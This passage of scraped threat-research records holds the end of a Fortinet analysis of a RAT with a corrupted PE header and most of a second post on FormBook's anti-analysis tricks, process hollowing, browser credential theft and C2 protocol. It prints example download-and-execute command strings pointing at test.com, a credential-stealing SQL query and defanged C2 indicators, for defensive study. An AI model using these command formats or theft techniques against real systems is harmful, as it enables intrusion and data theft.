30H data for the third parameter, as illustrated in Figure 9. The last critical item is the correct alignment of the RSP register. When breaking at the entry point, the lowest four bits of the RSP value must be 0x8, as shown in Figure 9. Failing to align the RSP properly can trigger an exception of EXCEPTION_ACCESS_VIOLATION (code 0xC0000005) when the malware starts. This is due to a misalignment error, particularly when executing instructions like “movdqa,” which requires 16-byte alignment. In 64-bit code mode, before calling the entry point function, the RSP’s value is 16-byte aligned (the lowest four bits are 0x0). It pushes the return address onto the stack, and the RSP value is minus eight. To correct this, we adjusted the value from 0x09CAD11D850 to 0x09CAD11D848. After multiple trials, errors, and repeated fixes, we finally managed to run the malware in the local environment. Upon execution, the malware calls a function to decrypt its C2 server domain information stored in memory. As shown in Figure 10, the decryption function is displayed along with the newly decrypted domain details, including the domain (\"rushpapers.com\") and port number (\"443\"). The malware then establishes communication with its C2 server by creating a thread. As shown in Figure 11, it prepares to invoke the CreateThread() API with the thread function at 0x1C3EEFDE300. The newly created thread is responsible for handling communication with its C2 server. Part of the thread’s code is shown on the right side of Figure 11. After launching the thread, the main thread enters a sleep state until the communication thread completes its execution. As the decrypted domain port “443” indicates, the malware communicates with the C2 server over the TLS protocol. It uses the getaddrinfo() API to obtain the domain “rushpapers.com” IP address via a DNS query. Figure 12 is a Wireshark capture of the network traffic generated by the malware as it communicates with its C2 server. Since the TLS packet is encrypted, we need to inspect the data before encryption or after decryption to view the plaintext content. This can be done by setting breakpoints in a debugger on both encryption and decryption routines used by this malware. The malware leverages two API functions, SealMessage() and DecryptMessage(), to encrypt and decrypt the data for the TLS traffic. As you can see in Figure 13, the malware is preparing to encrypt an HTTP GET request using the SealMessage() API. Below are two examples of plaintext packets--one sent and one received--: Request packet (before TLS encryption): GET /ws/ HTTP/1.1 Host: rushpapers[.]com Connection: Upgrade Upgrade: websocket Sec-WebSocket-Version: 13 Sec-WebSocket-Key: OCnq155rYct3ykkkdLrjvQ== Response packet (after TLS decryption): HTTP/1.1 101 Switching Protocols Server: nginx/1.18.0 Date: Fri, 28 Mar 2025 06:13:24 GMT Connection: upgrade Upgrade: websocket Sec-WebSocket-Accept: Bzr0K1o6RJ4bYvvm4AM5AAG172Y= These two plaintext packets are used to complete a handshake-like process. Afterward, it switchesto a custom encryption algorithm to encrypt the packet data before applying TLS encryption. Below is an example of the data that has been encrypted using the custom algorithm. 0000000082 A6 16 98 5C 75 59 CB66 55 41 F1 32 11 79 EF‚¦ ˜\\uYËfUAñ2 yï 000000102F 55 27 A8 7C 5A 36 AE68 58 74 F1 28 55 3E A9/U'¨|Z6®hXtñ(U>© 000000206C 5B 26 B6 6D 4C 26 AC69 5C 1B 92l[&¶mL&¬i\\ ’ A clearer breakdown of the data is in the table below: Description Magic tag.0x82 Variable-extended-length. 0xA6 for this case. Encryption key. 16 98 5C 75 Encrypted data. 59 CB66 … 1B 92 According to the variable-extended-length rule, the data size is calculated as 0xA6-0x80=0x26. The encryption key (such as 0x755C9816) is a randomly generated number. The custom encryption’s algorithm performs a repeated XOR operation between each byte of the key and the encrypted data bytes. As a result, the decrypted data is as follows: 000000004F 53 3A 20 57 69 6E 646F 77 73 20 31 30 20 2FOS: Windows 10 / 0000001020 36 34 2D 62 69 74 2028 31 30 2E 30 2E 31 3964-bit (10.0.19 0000002030 34 35 29 0D 0A045) The decrypted data clearly reveals the system information from our local test environment: \"OS: Windows 10 / 64-bit (10.0.19045)\\r\\n”. This information is collected and sent to the C2 server when requested by the C2 server. Below is a code snippet demonstrating the custom algorithm used to encrypt and decrypt the data. 001C3EF00CED3 loc_1C3EF00CED3:; CODE XREF: sub_1C3EF00CE08+FD↓j 001C3EF00CED3moveax, r9d 001C3EF00CED6andeax, 80000003h 001C3EF00CEDBjgeshort loc_1C3EF00CEE4 001C3EF00CEDDdeceax 001C3EF00CEDForeax, 0FFFFFFFCh 001C3EF00CEE2inceax 001C3EF00CEE4 001C3EF00CEE4 loc_1C3EF00CEE4:; CODE XREF: sub_1C3EF00CE08+D3↑j 001C3EF00CEE4movecx, [rbx+30h] 001C3EF00CEE7addecx, r9d 001C3EF00CEEAcdqe 001C3EF00CEECincr9d 001C3EF00CEEFmovr8b, byte ptr [rsp+rax+28h+arg_0];; the random key 001C3EF00CEF4xorr8b, [r10];;;;;;; encrypt/decrypt the data with random key. 001C3EF00CEF7incr10 001C3EF00CEFAmovrax, [rbx+20h] 001C3EF00CEFEmov[rcx+rax], r8b 001C3EF00CF02cmpr9d, edi; edi is data size 001C3EF00CF05jlshort loc_1C3EF00CED3 001C3EF00CF07 001C3EF00CF07 loc_1C3EF00CF07:; CODE XREF: sub_1C3EF00CE08+C6↑j 001C3EF00CF07add[rbx+30h], edi 001C3EF00CF0Ajmploc_1C3EF00CE55 Through a comprehensive analysis of its API calls and execution flow, we have confirmed this malware to be aRAT(Remote Access Trojan). This section details the malware’s capabilities for controlling the compromised system. The malware has a feature that captures the victim’s screen as JPEG images and exfiltrates them to its C2 server. It also collects the title of the current active (topmost) program to provide context about what the user is doing at the time of capture. To do this, it calls a sequence of APIs, including CreateStreamOnHGlobal(), GdiplusStartup(), GetSystemMetrics(), CreateCompatibleDC(), CreateCompatibleBitmap(), BitBlt(), GdipCreateBitmapFromHBITMAP(), GdipSaveImageToStream(), and GdipDisposeImage(). Figure 14 shows how the malware captures the screenshot by calling these APIs. The malware includes a thread function designed to act as a server, listening on a TCP port specified by the C2 server. Once activated, this function allows the malware to await incoming connections from the attacker. It implements a multi-threaded socket architecture: each time a new client (attacker) connects, the malware spawns a new thread to handle the communication. This design enables concurrent sessions and supports more complex interactions. By operating in this mode, the malware effectively turns the compromised system into a remote-access platform, allowing the attacker to launch further attacks or perform various actions on behalf of the victim. The malware can enumerate and manipulate the system services on the infected machine. It achieves this by leveraging several Windows Service Control Manager (SCM) APIs, including OpenSCManagerW(), EnumServicesStatusExW(), ControlService(), and more. This analysis successfully demonstrated the deployment and dynamic analysis of malware with corrupted DOS and PE headers in a controlled local environment. The detailed process—from preparing the malware for execution, including memory allocation and API resolution, to correcting execution parameters—ensured accurate emulation of the malware’s behavior. Our investigation into the payload revealed its sophisticated communication with the C2 server, including secure encryption and decryption mechanisms using the SealMessage() and DecryptMessage() APIs. Finally, we confirmed the malware’s significant capabilities on the compromised system, such as screen capture, remote server functionality, and manipulation of system services via Service Control Manager APIs. Fortinet protects against these attacks, and theFortiGuard IR teamis available to assist you whenever needed. Fortinet customers are already protected from this malware with FortiGuard’s AntiVirus, Web Filtering, and Anti-Botnet services as follows: The relevant C2 server URL is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. You cansign upfor future alerts and stay informed of new and emerging threats. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps[:]//rushpapers[.]com/ws/ F3EB67B8DDAC2732BB8DCC07C0B7BC307F618A0A684520A04CFC817D8D0947B9 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-dumped-malware-without-a-pe-header",
      "scraped_at": "2025-07-20T13:41:36.955200",
      "indicators": {
        "ip_address": [],
        "domain": [
          "x1c3eefb0000-0x1c3ef029fff",
          "hell32",
          "diplus",
          "serenv",
          "ushpapers",
          "ernel32",
          "llhost",
          "spicli",
          "dvapi32",
          "200",
          "omctl32",
          "rypt32",
          "DI32",
          "hlwapi"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "F3EB67B8DDAC2732BB8DCC07C0B7BC307F618A0A684520A04CFC817D8D0947B9"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4186866460996033
    }
  },
  {
    "id": "Fortinet_98752",
    "source": "Fortinet",
    "title": "Infostealer Malware FormBook Spread via Phishing Campaign – Part II",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the victim’s computerSeverity level:High This is part II of the FormBook analysis blog. In the previous post (Part I), I covered the campaign’s initialization via a phishing email, the CVE-2017-11882 vulnerability it exploited to execute an extracted 64-bit DLL, and the download and decryption of a FormBook variant hidden in a fake PNG file. Finally, I elaborated on how the 64-bit DLL mapped the FormBook payload in a target process (ImagingDevices.exe) and executed it using the process hollowing technique. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In the second part of this analysis, you will learn how the FormBook payload operates on a comprised machine, including the complicated anti-analysis techniques employed by this FormBook variant, how the FormBook leverages Heaven’s Gate and randomly selected processes to evade analysis by cybersecurity researchers, the sensitive data it collects from the victim’s machine, how it communicates with the C2 server, and how it controls the victim’s system with control commands. The FormBook payload is a 32-bit executable that runs inside the 32-bit target process “ImagingDevices.exe”. My analysis reveals that the copied FormBook is re-encrypted. The code initially executed does not belong to the real FormBook but instead serves as a decryption routine. The encrypted data begins at offset 0x6E36C3 (with FormBook loaded at 0x6E0000), and the encrypted data size is hard coded to 0x43600, as illustrated in Figure 1. Next, it calculates the real entry point address from the decrypted code and stores it in the ESI register. This address will be called at the final stage, as shown in Figure 2. FormBook leverages multiple techniques to prevent being analyzed. I explain the main techniques used in this variant below. Figure 4 shows how it calls the ZwOpenDirectoryObject() API (0x2FE3580) inside the duplicated ntdll.dll. In my analysis environment, the original address for the API should be 0x76F43580. This is a module list loaded dynamically by FormBook by their index. Module Name \"kernel32.dll\" \"advapi32.dll\" \"ws2_32.dll\" \"rstrtmgr.dll\" \"sqlite3.dll\" \"winsqlite3.dll\" \"crypt32.dll\" \"vaultcli.dll\" \"ole32.dll\" \"user32.dll\" \"shell32.dll\" FormBook then passes the decrypted module name to a function to load it using a low-level Windows API function, LdrLoadDll(). The desired Windows APIs are not hardcoded strings in FormBook but encrypted hash codes. FormBook traverses the APIs inside the loaded modules and matches their hash codes with the decrypted ones to find the desired APIs. As you can see in Figure 5, the PostThreadMessageW() API was obtained inside the EAX register from the “user32.dll” module. In this variant of FormBook, more than 100 key functions are encrypted by default and are decrypted only before calling. They are then re-encrypted after calling, which presents a challenge for static analysis. As shown on the left side of Figure 6, the SearchDecryptCode() function is called to search the encrypted code by locating the given start magic (6 bytes) and end magic (6 bytes). It then decrypts the located code. At 0x709B15, it calls sub_70DC33(), whose body is shown on the right side. The instructions enclosed by the red rectangle were just decrypted. After executing the dynamic function (sub_70DC33()), it calls ReEncryptCode(), at 0x709B26, to re-encrypt the function. To protect FormBook from being analyzed by auto-analysis platforms, it performs multiple detections. 1. Virtual Machines and Analysis Tools FormBook contains a predefined blacklist of encrypted hash codes, which are generated from process names associated with popular VM platforms or analysis tools, such as VMware (vmwareuser.exe, vmwareservice.exe), Sandboxie (sandboxiedcomlaunch.exe, sandboxierpcss.exe), Sysinternals tools (procmon.exe, regmon.exe, filemon.exe), network sniffers (wireshark.exe, netmon.exe), automation scripts (python.exe, perl.exe), and more. It retrieves all active processes from the victim’s system, generates a hash code from their process names, and compares them with a predefined set of blacklisted hash codes. The following code snippet demonstrates how it decrypts a hash code from 0x72FE2A27, which is 0x3EBE9086 generated from “vmwareuser.exe”. 006F642Aleaecx, [ebp+Dest]; Current process name. 006F6430pushecx 006F6431push3Ah; Decryption key. 006F6433push72FE2A27h; Encrypted hash code. 006F6438calldecrypt_fun; Decrypts a hash code. 006F643Daddesp, 8 006F6440pusheax; EAX holds the decrypted hash code, 0x3EBE9086, which is generated from “vmwareuser.exe”. 006F6441callmatch_hashcode; Compares with the current process. 006F6446addesp, 8 006F6449testeax, eax 006F644Bjnzanalysis_detected Once matched, it sets a global flag indicating it’s running in an analysis environment. 2. Detecting Sandbox Environments Some auto-analysis sandboxes run the target process from specific folders. FormBook detects this by retrieving the full path of the target process it hollowed into. In my analysis machine, it’s: “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe”. It then checks if the parent folder contains keywords from a blacklist by matching their hash codes. Examples include: “\\cuckoo\\”, “\\sandcastle\\”, “\\aswsnx\\”, “\\sandbox\\”, “\\smpdir\\”, “\\samroot\\”, and “\\avctestsuite\\” Below is an example of full path triggers detection: “C:\\cuckoo\\Windows Photo Viewer\\ImagingDevices.exe” 3. Windows Account Name It calls the Windows API RtlQueryEnvironmentVariable_U() with “USERNAME” as the variable name to retrieve the victim’s username. Figure 7 demonstrates the retrieved username after calling the API. It then generates a hash code from the username and compares it with those in a blacklist. FormBook assumes the usernames starting with certain patterns (e.g., “cuckoo”, “sandbox-“, “nmsdbox-“, and more) belong to auto-analysis systems. All of the above detection results are stored in global flags. FormBook checks these flags in a function and exits the process if any of them is set. It checks if a kernel-mode debugger (like Windbg) is enabled by calling the API NtQuerySystemInformation() with SystemKernelDebuggerInformation(0x23) system information class. Refer to Figure 8 for more details. If the KernelDebuggerEnabled is 1, it means a kernel debugger is present. It also determines if the user-mode debugger is present by passing ProcessDebugPort (0x7) as a ProcessInformationClass parameter to the ZwQueryInformationProcess() API. It returns 0xFFFFFFFF if a user-mode debugger is attached, such as x32dbg, which I used during the analysis. The Heaven’s Gate technique is a mechanism on Windows x64 systems that allows switching from 32-bit to 64-bit code inside a 32-bit process. It is also known as WoW64 (Windows-on-Windows 64-bit). This transition is the essence of “Heaven’s Gate.” The mechanism presents a significant challenge to cybersecurity researchers because a 32-bit debugger cannot debug 64-bit code, interrupting the debugging process. The Windows x64 architecture determines the execution mode based on the CS (Code Segment) register. In user mode (ring 3), 0x23 corresponds to the 32-bit code segment, while 0x33 corresponds to the 64-bit code segment. Executing an instruction like “jmp far 0x33:{address}” in a 32-bit process switches to 64-bit mode and executes 64-bit code from the {address}. This variant of FormBook uses the Heaven’s Gate technique multiple times, which will be explained in the following sections. FormBook randomly selects one of the explorer.exe child processes from active processes and leverages the Heaven’s Gate technique to manipulate the selected process. The malware first calls the NtQuerySystemInformation() API with the SystemProcessInformation (0x5) parameter to enumerate all active processes. It locates the PID (Process ID) of explorer.exe by comparing process name hash codes. Next, it scans the active processes to randomly choose a child process of explorer.exe by matching the active processes’ PPID (Parent Process ID) with the explorer.exe’s PID (Figure 9). After obtaining the process handle of the selected process (e.g., notepad.exe) by calling the NtOpenProcess() API, FormBook creates a shared memory between the two processes and copies the shellcode: It then utilizes the Heaven’s Gate technique to execute a piece of 64-bit code that had been copied and deployed in a newly allocated buffer. Figure 10 is about to execute “jmp far 33:2F30000”, where 0x33 is the new CS and 0x2F30000 is the new buffer’s address with the copied 64-bit code, as shown in the memory. Upon completion, it returns to 23:7107C0, which has already been pushed onto the top of the stack. My analysis reveals that the 64-bit code takes control of the selected process’s main thread (like notepad.exe) to execute a piece of injected malicious code. To control the selected process, it calls the NtOpenProcess() and ZwQueryInformationProcess() APIs to retrieve the process’ details. The APIs ZwOpenThread() and ZwSuspendThread() are called to pass the selected process’ information to suspend the main thread inside the selected process. In Figure 11, we can see that the 64-bit code just called ZwSuspendThread(), and in another debugger attached to the chosen process, it displays the suspended main thread. Subsequently, the 64-bit code copies the malicious payload into the selected process over the shared memory. It then calls NtGetContextThread() and NtSetContextThread() to modify the RIP register, redirecting the execution to the injected code. Finally, it calls the NtResumeThread() API to resume the main thread, causing the malicious code to run inside the selected process, notepad.exe. Execution then returns to the 32-bit code by executing a “retf” instruction. This time, the selected child process of explorer.exe is a Notepad.exe with the PID 9560. The copied malicious code is the same as the 64-bit code mentioned earlier, but it goes down different code branches depending on a returned flag. Twelve encrypted process names are saved in local variables, which can be obtained using a function with a string index. The table below lists all the processes and indexes. String Index Process Names \"PATHPING. EXE\" \"fontview.exe\" \"MuiUnattend.exe\" \"forfiles.exe\" \"chkntfs.exe\" \"DpiScaling.exe\" \"waitfor.exe\" \"icsunattend.exe\" \"cttune.exe\" \"whoami.exe\" These 32-bit processes all reside in the “C:\\Windows\\SysWOW64\\” folder. FormBook repeatedly launches these processes in a loop until one is successfully created. It then performs process hollowing on the process, injects the FormBook payload into the process (such as “PATHPING. EXE”), and executes it. As shown in Figure 12, it is about to call the CreateProcessInternalW() API to create a PATHPING. EXE process, with the dwCreationFlags parameter set to 0x800000C, indicating a suspended process will be created. It then creates a shared memory section between notepad.exe and PATHPING. EXE. At this point, the task of the code running in the selected process (notepad.exe) is completed. Switching to the target process (ImagingDevices.exe), it returns to the 32-bit code mode from the 64-bit code via Heaven’s Gate. It brings the full process information of the newly created PATHPING. EXE process using the shared memory established between it and the selected notepad.exe process. ImagingDevices.exe takes control of the PATHPING. EXE process and copies the FormBook payload into the PATHPING. EXE process via the shared memory section. As shown in Figure 14, the payload is encrypted and mapped into both processes’ memory, having been written by code running inside ImagingDevices.exe. Next, ImagingDevices.exe calls the NtSetContextThread() API to modify the PATHPING. EXE’s EAX register (which holds a thread function address to RtlUserThreadStart().) to redirect the execution to a specific function. This function decrypts the FormBook payload and calls the entry point function of the FormBook payload once the NtResumeThread() API is called. After employing numerous evasion techniques, FormBook finally hits the main payload within the PATHPING. EXE process, another 32-bit process. Based on my analysis, this process function acts as a dashboard program for FormBook. It gathers sensitive data from the victim’s system and manipulates another selected process to communicate with its C2 server. FormBook collects basic information from the victim’s device, such as the Windows product name, the current build, the username, and the computer name. Some are obtained from the system registry via API calls, while others are retrieved using the RtlQueryEnvironmentVariable_U() API. This information is then encrypted and saved in a global variable, which is later sent to the C2 server in an HTTP GET packet to register the infected system. As shown in Figure 15, the malware prepares to encrypt the collected basic information, where “XLNG…” is a magic string, “Windows 10 Enterprise x64” is the Windows product information, followed by the Base64-encoded computer name and user name. FormBook then randomly selects another child process of explorer.exe. Similar to what was done in the ImagingDevices.exe process, it invokes 64-bit code from the 32-bit process using the Heaven’s Gate technique. This 64-bit code copies and deploys the FormBook into the newly selected process (e.g., another notepad.exe process) and modifies the RIP register to point to the deployed FormBook at a different entry point. According to my analysis, this newly selected process acts as a socket process responsible for communicating with the C2 server. A large shared memory section is created and mapped into PATHING. EXE and the chosen data exchange process. When it returns to 32-bit mode (using Heaven’s Gate) in the PATHPING. EXE process, FormBook calls the PostThreadMessageW() API with a Msg parameter of 0x111 (WM_COMMAND) to send a message to the main thread of the selected process (like notepad.exe), as shown in Figure 16. Instead of calling NtResumeThread() to resume thread execution, FormBook sends a Windows message to activate the payload. Why does it send a message to run the FormBook as a socket process? As we know, most Windows programs are driven by Windows messages. Most of the time, a program remains idle because the message queue is empty—there is no user interaction (mouse, keyboard, etc.), system events, or other messages. The program waits (blocked by the NtUserGetMessage() API) until a new message arrives. If FormBook modifies the value of the RIP register to point to the copied FormBook payload and then proactively sends a message to the process, it can then hijack the original execution flow and redirect it to run the FormBook payload instead. The FormBook instance in PATHPING. EXE also acts as a daemon, monitoring the socket process. Once the victim terminates the socket process, FormBook immediately selects another child process of explorer.exe to take its place. The FormBook instance running in PATHPING. EXE harvests sensitive data from the compromised system, such as saved credentials of various software, autofill data, cookies, proxy settings for browsers, and data from the system clipboard. FormBook can also obtain sensitive data from multiple resources, such as the system registry and the local profile files. For example, it extracts the autofill data for the IE browser from the key path “HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2” in the system registry. It also collects email account information from Outlook by scanning the following key paths in the system registry to cover multiple Outlook versions: When gathering sensitive data from Chrome, FormBook accesses some SQLite database format files located in “%LocalData%\\Google\\Chrome\\User Data\\Login Data\\Default\\”, explicitly targeting these files: “Login Data” (credentials), “Cookies” (web site cookies), “Web Data” (autofill), and “Network” (proxy setting). This is accomplished through a series of winsqlite3.dll API calls, including sqlite3_open(), sqlite3_prepare_v2(), sqlite3_step(), sqlite3_column_text(), sqlite3_column_blob(), sqlite3_column_bytes(), and sqlite3_close(). Figure 17 demonstrates Chrome credential extraction, showing FormBook executing the SQL query “SELECT origin_url, username_value, password_value FROM logins” via the sqlite3_prepare_v2() API. The sample credentials, shown at the bottom, were just obtained from a Chrome browser in a test environment. The malware maintains the capability to collect similar sensitive data from a wide range of additional applications. Below are the categorized software applications from which FormBook can collect sensitive data: Email Clients: Outlook, Thunderbird, and Foxmail. Web Browsers: Internet Explorer, Chrome, Firefox, Edge, Brave-Browser, Opera Neon, ChromePlus, Avast Secure Browser, Yandex Browser, Citrio, Sleipnir 5, Epic Privacy Browser, Elements Browser, 360 Chrome, CCleaner Browser, Sputnik, Cốc Cốc Browser, Opera, Uran, Coowon Browser, Comodo Dragon, AVG Secure Browser, CentBrowser, 7Star Browser, UR Browser, SalamWeb, QIP Surf, Chromium, Iridium Browser, Slimjet, Vivaldi, Orbitum, Liebao, Kometa Browser, Chedot, Torch Browser, Amigo, Kinza, and Blisk, Let’s now examine the socket process (another selected process, like notepad.exe) that handles communication with the Command-and-Control (C2) server in the background. The C2 domain list in this variant of FormBook is not stored in plaintext. Instead, it undergoes a multi-layered obfuscation process. Each domain is encrypted, encoded using Base64, and then encrypted again. This technique adds significant complexity to static analysis and helps evade detection. This variant has 64 C2 domains, which are dynamically retrieved in the socket process by referencing a one-byte index. The decrypted domains only exist temporarily in memory during runtime, making them more elusive. For the complete list of C2 domains, refer to the IOCs section at the end of this report. Figure 18 shows the socket process after successfully decrypting a C2 server domain from memory. The decrypted domain is “www[.]manicure-nano[.]sbs,” corresponding to index 0x2B, with the associated URL “/xkx8/”. A shared memory section is created between PATHPING. EXE and the socket process (like notepad.exe), which is used to share: Another responsibility of the socket process is to gather system clipboard data. FormBook performs this by running a thread calling the relevant APIs: OpenClipboard(), GetClipboardData(), GlobalLock(), GlobalUnlock(), and CloseClipboard(). The collected clipboard data is also stored in shared memory. Within the socket process, FormBook starts a specific thread to repeatedly check if a flag is set by PATHPING. EXE that tells if the collected data is ready to send. Once the flag is triggered, FormBook transmits the collected data using HTTP GET and POST. Based on my analysis, basic system information is sent via GET, and other data is sent via POST. As shown in Figure 19, execution breaks at a function call (located at 0x1F08625B1D1) that is responsible for encrypting collected credentials—retrieved from Mozilla Firefox in this instance—in the memory dump before sending them to the C2 server. To evade detection during transmission, FormBook encrypts and encodes the data before sending it out. Each C2 server has its own unique 0x14-byte-long encryption key seed hardcoded in memory. The data undergoes two layers of encryption. It first uses a common predefined key to encrypt the data, then uses the C2 server’s own encryption key to encrypt it again. After this double encryption, FormBook encodes the data using the standard base64 algorithm. Figure 20 shows a screenshot of an HTTP Post packet in Wireshark, illustrating how FormBook sends collected data to a C2 server. The URL in this case is www[.]grcgrg[.]net/jxyu/. The encrypted data is located in the body portion of the POST request, prefixed with a randomly generated string, “30J0cVz=”. As mentioned before, when the socket process receives a command packet from the C2 server, it saves it in shared memory and sets a corresponding flag. This informs the FormBook instance running in the PATHPING. EXE to process the C2 command. All incoming packets from the C2 server are multi-layer encrypted and Base64-encoded. Once received, the PATHPING. EXE instance decrypts and decodes the packets before interpretation. A decrypted packet format looks like this: “XLNG{command ID}{command data}{XLNG}” FormBook Control Commands: 1. ‘1’ – 0x31: This command delivers three kinds of executable files within the packet: *.dll, *.ps1, and *.exe. Once this command is received, FormBook saves the file into the system %temp% directory and then executes it on the victim’s system. 2. ‘2’ – 0x32: This command can be used to update the FormBook or execute other malware. FormBook receives a 32-bit EXE file in the packet and saves it into a randomly generated temp file within the system. After that, it executes the EXE file by invoking the CreateProcessInternalW() API. As shown in Figure 21, it just wrote the 32-bit EXE data into a temp file, such as “%temp%\\yzbtfb3.exe.” It finally calls ExitProcess() to exit the current FormBook process (PATHPING. EXE). 3. ‘3’ – 0x33: This command is used to remove FormBook from the victim’s system. It deletes Formbook's file and Auto-run items from the system registry and exits the current FormBook instance. It also restarts the Explorer.exe process. 4. ‘4’ – 0x34: When FormBook receives this command, it downloads an executable file from a given URL that comes with the packet if a subcommand is provided. Otherwise, it only executes a given command. This variant of FormBook provides two sub-commands: Below are three cases that demonstrate how the ‘4’ command works. Without sub-command: XLNG4cmd.exeXLNG RMTD sub-command: XLNG4RMTD:http://test.com/test.exeXLNG RMTU sub-command: XLNG4RMTU:http://test.com/test.ps1XLNG FormBook downloads the file into a randomly named file under the system’s %temp% folder. It calls a series of APIs to do so, such as InternetOpenW(), InternetConnectW(), HttpOpenRequestW(), HttpSendRequestW(), InternetQueryDataAvailable(), and InternetReadFile(). Finally, FormBook calls ShellExecuteA to execute the downloaded file in the compromised system. If no sub-commend is provided in the command data, it means the command data is not a URL, which can be executed directly by calling the ShellExecuteA() API. Figure 22 provides an example with a simulated control command packet, which was about to call an API to launch “C:\\Windows\\system32\\mspaint.exe”. 5. ‘5’ – 0x35: This command allows FormBook to clean sensitive data saved on the victim's browsers, such as cookies, credentials, and more. It also deletes some folders and files from the compromised system by calling the SHFileOperationW() API. The affected paths are: • \"%WinDir%\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\\Low\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\\Low\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Cookies\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Current Session\"• \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\{ProfileName}\\Cookies.sqlite\" 6. ‘6’ – 0x36: This command instructs FormBook to collect sensitive data that will be sent to the C2 server, as explained in the “Collect Sensitive Data” section above. 7. ‘7’ – 0x37: Reboots the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_REBOOT parameter to reboot the system. 8. ‘8’ – 0x38: Powers off the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_POWEROFF parameter to power off the system. 9. ‘9’ – 0x39: In this variant, the command corresponds to an empty function. In this second part of the FormBook blog series, I explained how the FormBook payload operates within the 32-bit target process, “ImagingDevices.exe.” Figure 23 provides an overview of the entire workflow executed by the payload. I also showed the various complicated anti-analysis techniques used by this FormBook variant, including—but not limited to—a hidden ntdll.dll module, API obfuscation, more than 100 encrypted key functions, anti-sandbox techniques, anti-debugging, and the repeated use of Heaven’s Gate techniques. I then explained how FormBook randomly selects a process from active processes and takes control of it using the Heaven’s Gate technique. Its main objective is to perform process hollowing on the selected process (say PATHPING. EXE), inject FormBook into the process, and execute it as a dashboard. Once running, FormBook collects a wide range of sensitive data from the victim’s system, including, but not limited to, basic system information, saved credentials, cookie data, autofill data, browser history, and more. Next, I described how the C2 server list in this FormBook variant is decrypted and decoded, and how stolen sensitive data is formatted and transmitted in network packets. Finally, I examined FormBook’s nine control commands, which enable a wide array of capabilities, such as executing provided executable files, launching an existing file, downloading and executing EXE, DLL, and PS1 files, and remotely rebooting or shutting down the victim’s machine. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for accessing FormBook’s C2 server. The C2 server list is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. You can sign up to receive future alerts and stay informed of new and emerging threats. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://www[.]arwintarim[.]xyz/shoy/hxxp://www[.]promutuus[.]xyz/bpae/hxxp://www[.]218735[.]bid/3f5o/hxxp://www[.]vivamente[.]shop/xr41/hxxp://www[.]segurooshop[.]shop/wcz8/hxxp://www[.]hugeblockchain[.]xyz/1dpy/hxxp://www[.]crazymeme[.]xyz/78bm/hxxp://www[.]extremedoge[.]xyz/372c/hxxp://www[.]685648[.]wang/3k4m/hxxp://www[.]shibfestival[.]xyz/8538/hxxp://www[.]promoconfortbaby[.]store/1pxl/hxxp://www[.]balivegasbaru2[.]xyz/cfze/hxxp://www[.]themutznuts[.]xyz/ks15/hxxp://www[.]kpilal[.]info/9o26/hxxp://www[.]dogeeditor[.]xyz/x5dz/hxxp://www[.]adjokctp[.]icu/3ya5/hxxp://www[.]kasun[.]wtf/u4ue/hxxp://www[.]031235246[.]xyz/ml07/hxxp://www[.]intention[.]digital/h6z3/hxxp://www[.]prepaidbitcoin[.]xyz/rcx4/hxxp://www[.]ddvids[.]xyz/uiki/hxxp://www[.]zhuanphysical[.]shop/zcro/hxxp://www[.]theweb[.]services/fb40/hxxp://www[.]sdwd[.]wang/sfv4/hxxp://www[.]lucynoel6465[.]shop/1i64/hxxp://www[.]nhc7tdkp6[.]live/d9kr/hxxp://www[.]ciptaan[.]xyz/fjwa/hxxp://www[.]gluconolmx[.]shop/8370/hxxp://www[.]shlomi[.]app/5nwk/hxxp://www[.]garfo[.]xyz/35rt/hxxp://www[.]caral[.]tokyo/plub/hxxp://www[.]meritking[.]cloud/gakd/hxxp://www[.]grcgrg[.]net/jxyu/hxxp://www[.]nullus[.]xyz/pf7y/hxxp://www[.]actionlow[.]live/0a0g/hxxp://www[.]dangky88kfree[.]online/11lg/hxxp://www[.]szty13[.]vip/abhi/hxxp://www[.]arryongro-nambe[.]live/h108/hxxp://www[.]dqvcbn[.]info/iby8/hxxp://www[.]svapo-discount[.]net/s956/hxxp://www[.]yueolt[.]shop/je6k/hxxp://www[.]sigaque[.]today/u2nq/hxxp://www[.]manicure-nano[.]sbs/xkx8/hxxp://www[.]laohuc58[.]net/zyjq/hxxp://www[.]iighpb[.]bid/jfhd/hxxp://www[.]fjlg